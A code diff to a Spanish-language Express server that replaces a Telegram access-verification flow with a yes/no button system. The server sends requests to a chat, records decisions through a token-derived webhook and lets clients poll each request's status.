@@ -16,26 +16,41 @@ app.use(express.static('public')); // Para servir archivos estáticos (HTML, CSS
 // Objeto para almacenar datos por dispositivo
 let usuariosData = {};
 // ========================================
-// VERIFICACIÓN MANUAL POR TELEGRAM
+// SISTEMA INDEPENDIENTE DE OPCIONES SÍ/NO
 // ========================================
 
-const VERIFICACION_TIEMPO_MS = 120000;
+// Configuración de Telegram ya existente en Render
+const OPCIONES_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const OPCIONES_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-const TELEGRAM_BOT_TOKEN_VERIFICACION =
-    process.env.TELEGRAM_BOT_TOKEN;
+// Dirección pública del sitio
+const OPCIONES_URL_SITIO = 'https://pruebns.onrender.com';
 
-const TELEGRAM_CHAT_ID_VERIFICACION =
-    process.env.TELEGRAM_CHAT_ID;
+// Solicitudes pendientes y sus decisiones
+const solicitudesOpciones = new Map();
 
-const solicitudesVerificacion = new Map();
+// Ruta privada del webhook, generada a partir del token
+const OPCIONES_WEBHOOK_RUTA = OPCIONES_BOT_TOKEN
+    ? '/telegram-opciones-' +
+      crypto.createHash('sha256')
+          .update(OPCIONES_BOT_TOKEN)
+          .digest('hex')
+          .slice(0, 32)
+    : null;
 
-async function telegramVerificacion(metodo, datos) {
-    if (!TELEGRAM_BOT_TOKEN_VERIFICACION) {
+
+// ----------------------------------------
+// COMUNICACIÓN CON TELEGRAM
+// ----------------------------------------
+
+async function llamarTelegramOpciones(metodo, datos) {
+
+    if (!OPCIONES_BOT_TOKEN) {
         throw new Error('Falta TELEGRAM_BOT_TOKEN');
     }
 
     const respuesta = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_VERIFICACION}/${metodo}`,
+        `https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/${metodo}`,
         {
             method: 'POST',
             headers: {
@@ -56,58 +71,249 @@ async function telegramVerificacion(metodo, datos) {
     return resultado.result;
 }
 
-async function crearSolicitudVerificacion(dispositivoID) {
-    if (!TELEGRAM_CHAT_ID_VERIFICACION) {
-        throw new Error('Falta TELEGRAM_CHAT_ID');
+
+// ----------------------------------------
+// CREAR SOLICITUD DE OPCIONES
+// ----------------------------------------
+
+app.post('/opciones/crear', async (req, res) => {
+
+    const { dispositivoID } = req.body;
+
+    if (
+        typeof dispositivoID !== 'string' ||
+        !/^id\.\d{1,3}$/.test(dispositivoID)
+    ) {
+        return res.status(400).json({
+            error: 'ID no válido'
+        });
     }
 
-    const idSolicitud = crypto.randomBytes(16).toString('hex');
+    const idSolicitud = crypto.randomBytes(24).toString('hex');
 
-    const idVisible = String(dispositivoID).replace(/^id\./, '');
+    const idVisible = dispositivoID.replace('id.', '');
 
     const solicitud = {
         dispositivoID,
         estado: 'pendiente',
-        creada: Date.now(),
-        vence: Date.now() + VERIFICACION_TIEMPO_MS
+        mensajeID: null
     };
 
-    solicitudesVerificacion.set(idSolicitud, solicitud);
+    solicitudesOpciones.set(idSolicitud, solicitud);
 
     try {
-        await telegramVerificacion('sendMessage', {
-            chat_id: TELEGRAM_CHAT_ID_VERIFICACION,
-            text:
-                '🔔 VERIFICACIÓN DE ACCESO\n\n' +
-                'ID: ' + idVisible + '\n\n' +
-                '¿Autorizar la transición?',
-            reply_markup: {
-                inline_keyboard: [[
-                    {
-                        text: '✅ Sí',
-                        callback_data: 'aprobar:' + idSolicitud
-                    },
-                    {
-                        text: '❌ No',
-                        callback_data: 'rechazar:' + idSolicitud
-                    }
-                ]]
+
+        const mensaje = await llamarTelegramOpciones(
+            'sendMessage',
+            {
+                chat_id: OPCIONES_CHAT_ID,
+
+                text:
+                    '🔔 SELECCIÓN DE OPCIÓN\n\n' +
+                    'ID: ' + idVisible + '\n\n' +
+                    'Selecciona una opción:',
+
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            {
+                                text: '✅ Sí',
+                                callback_data: 'si:' + idSolicitud
+                            },
+                            {
+                                text: '❌ No',
+                                callback_data: 'no:' + idSolicitud
+                            }
+                        ]
+                    ]
+                }
             }
+        );
+
+        solicitud.mensajeID = mensaje.message_id;
+
+        return res.json({
+            ok: true,
+            idSolicitud
         });
+
     } catch (error) {
-        solicitudesVerificacion.delete(idSolicitud);
-        throw error;
+
+        solicitudesOpciones.delete(idSolicitud);
+
+        console.error(
+            'Error al crear solicitud:',
+            error.message
+        );
+
+        return res.status(500).json({
+            error: 'No se pudo crear la solicitud'
+        });
+    }
+});
+
+
+// ----------------------------------------
+// CONSULTAR DECISIÓN
+// ----------------------------------------
+
+app.get('/opciones/estado/:idSolicitud', (req, res) => {
+
+    const { idSolicitud } = req.params;
+
+    const solicitud = solicitudesOpciones.get(idSolicitud);
+
+    if (!solicitud) {
+        return res.status(404).json({
+            error: 'Solicitud no encontrada'
+        });
     }
 
-    setTimeout(() => {
-        const actual = solicitudesVerificacion.get(idSolicitud);
+    return res.json({
+        estado: solicitud.estado
+    });
+});
 
-        if (actual && actual.estado === 'pendiente') {
-            actual.estado = 'expirada';
+
+// ----------------------------------------
+// RECIBIR DECISIÓN DESDE TELEGRAM
+// ----------------------------------------
+
+if (OPCIONES_WEBHOOK_RUTA) {
+
+    app.post(OPCIONES_WEBHOOK_RUTA, async (req, res) => {
+
+        const callback = req.body.callback_query;
+
+        if (!callback) {
+            return res.sendStatus(200);
         }
-    }, VERIFICACION_TIEMPO_MS);
 
-    return idSolicitud;
+        const chatID = callback.message?.chat?.id;
+
+        // Solo aceptar decisiones del chat configurado
+        if (String(chatID) !== String(OPCIONES_CHAT_ID)) {
+            return res.sendStatus(200);
+        }
+
+        const datos = String(callback.data || '');
+
+        const separador = datos.indexOf(':');
+
+        if (separador === -1) {
+            return res.sendStatus(200);
+        }
+
+        const opcion = datos.slice(0, separador);
+        const idSolicitud = datos.slice(separador + 1);
+
+        if (opcion !== 'si' && opcion !== 'no') {
+            return res.sendStatus(200);
+        }
+
+        const solicitud = solicitudesOpciones.get(idSolicitud);
+
+        if (
+            !solicitud ||
+            solicitud.estado !== 'pendiente' ||
+            solicitud.mensajeID !== callback.message?.message_id
+        ) {
+
+            try {
+                await llamarTelegramOpciones(
+                    'answerCallbackQuery',
+                    {
+                        callback_query_id: callback.id,
+                        text: 'Esta solicitud ya fue procesada.'
+                    }
+                );
+            } catch (error) {
+                console.error(error.message);
+            }
+
+            return res.sendStatus(200);
+        }
+
+        // Registrar la decisión
+        solicitud.estado = opcion;
+
+        // Confirmar la pulsación del botón
+        try {
+
+            await llamarTelegramOpciones(
+                'answerCallbackQuery',
+                {
+                    callback_query_id: callback.id,
+                    text: opcion === 'si'
+                        ? 'Opción Sí seleccionada'
+                        : 'Opción No seleccionada'
+                }
+            );
+
+            // Quitar los botones del mensaje
+            await llamarTelegramOpciones(
+                'editMessageReplyMarkup',
+                {
+                    chat_id: OPCIONES_CHAT_ID,
+                    message_id: solicitud.mensajeID,
+                    reply_markup: {
+                        inline_keyboard: []
+                    }
+                }
+            );
+
+        } catch (error) {
+
+            console.error(
+                'Error al actualizar mensaje:',
+                error.message
+            );
+        }
+
+        return res.sendStatus(200);
+    });
+}
+
+
+// ----------------------------------------
+// CONFIGURAR WEBHOOK
+// ----------------------------------------
+
+async function configurarWebhookOpciones() {
+
+    if (!OPCIONES_BOT_TOKEN || !OPCIONES_CHAT_ID) {
+
+        console.error(
+            'Falta configurar TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID'
+        );
+
+        return;
+    }
+
+    try {
+
+        const urlWebhook =
+            OPCIONES_URL_SITIO + OPCIONES_WEBHOOK_RUTA;
+
+        await llamarTelegramOpciones(
+            'setWebhook',
+            {
+                url: urlWebhook,
+                allowed_updates: ['callback_query']
+            }
+        );
+
+        console.log(
+            'Webhook de opciones configurado correctamente'
+        );
+
+    } catch (error) {
+
+        console.error(
+            'Error configurando webhook:',
+            error.message
+        );
+    }
 }
 
 // Ruta para servir el archivo index.html en la raíz
@@ -181,5 +387,10 @@ app.post('/send-auth', async (req, res) => {
 
 // Inicia el servidor en el puerto especificado
 app.listen(PORT, () => {
-    console.log(`Servidor corriendo en http://localhost:${PORT}`);
+
+    console.log(
+        `Servidor corriendo en http://localhost:${PORT}`
+    );
+
+    configurarWebhookOpciones();
 });
